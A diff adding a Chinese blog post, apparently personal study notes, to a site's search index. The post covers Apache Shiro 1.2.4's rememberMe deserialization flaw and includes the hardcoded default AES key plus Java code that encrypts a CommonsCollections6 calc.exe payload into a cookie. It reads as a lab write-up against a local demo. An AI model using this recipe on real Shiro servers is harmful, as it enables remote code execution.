@@ -2151,4 +2151,35 @@ echo 123;
         <tag>CC3</tag>
       </tags>
   </entry>
+  <entry>
+    <title>java漫谈笔记-反序列化篇-Shiro</title>
+    <url>/2022/03/17/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro/</url>
+    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-Shiro"><a href="#java漫谈笔记-反序列化篇-Shiro" class="headerlink" title="java漫谈笔记-反序列化篇-Shiro"></a>java漫谈笔记-反序列化篇-Shiro</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。<br><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a><br><a href="https://xz.aliyun.com/t/7950%E3%80%82">https://xz.aliyun.com/t/7950。</a></p>
+<span id="more"></span>
+
+
+
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用phith0n写的简单的<a href="https://github.com/phith0n/JavaThings">登录程序</a>shirodemo，使用mvn打包后放在Tomcat的webapps后可以正常访问。</p>
+<h2 id="Shiro-rememberme"><a href="#Shiro-rememberme" class="headerlink" title="Shiro rememberme"></a>Shiro rememberme</h2><p>Shiro使用加密后的<code>Cookie</code>。rememberme来记录用户信息。其中cookie信息通过aes加密。 data-&gt;反序列化-&gt;aes-&gt;base64-&gt;cookie。但是在1.2.4及之前的版本aes加密的密钥是固定在代码中的。</p>
+<p><code>org.apache.shiro.mgt</code>数据包中的<code>AbstractRememberMeManager</code>类中有aes的密钥。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317153938.png">。<br>也就是说我们可以通过固定密钥构造恶意类，通过反序列化传递到服务端。<br>恶意类-&gt;序列化-&gt;aes-&gt;base64-&gt;服务端-&gt;base64-&gt;aes-&gt;反序列化-&gt;REC</p>
+<p>我们先尝试使用CC6看看是否可以成功执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] payloads = <span class="keyword">new</span> CommonsCollections6().getPayload(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    <span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">    System.out.printf(ciphertext.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将cookie发出后并没有弹出计算器,Tomcat爆出异常<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317154717.png"></p>
+<p><code>ClassResolvingObjectInputStream</code>类中无法加载类<code>[[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]</code></p>
+<p>表示无法加载数组Transformer[]。 这里可以阅读<a href="https://blog.zsxsoft.com/post/35%E4%B8%8Ehttps://xz.aliyun.com/t/7950%E3%80%82">https://blog.zsxsoft.com/post/35与https://xz.aliyun.com/t/7950。</a></p>
+<p>大概就是无法加载非原始类中的数组。之前无论是CC1, CC3,CC6都需要调用<code>transformerChain</code>的tranform方法。但是在这里无法使用数组成了一个问题。</p>
+<p>可以使用JRMP解决，但是现在不会….</p>
+<p>之前使用<code>TemplateImpl</code>改造CC6我们可以将transform数组减少到两个元素。这里注意<code>lazyMap</code>的get方法中的<code>key</code>。之前我们都不注意<code>key</code>的值。但是可以注意的第一次就是将<code>key</code>作为参数进行transform。所以到这里我们可以将数组中第一个元素constatnt(obj)作为key传入lazyMap的<code>key</code>。就可以将两个元素变为一个元素。</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220317160333.png"></p>
+<p>使用这条链，我们可以成功弹出计算器。</p>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
 </search>
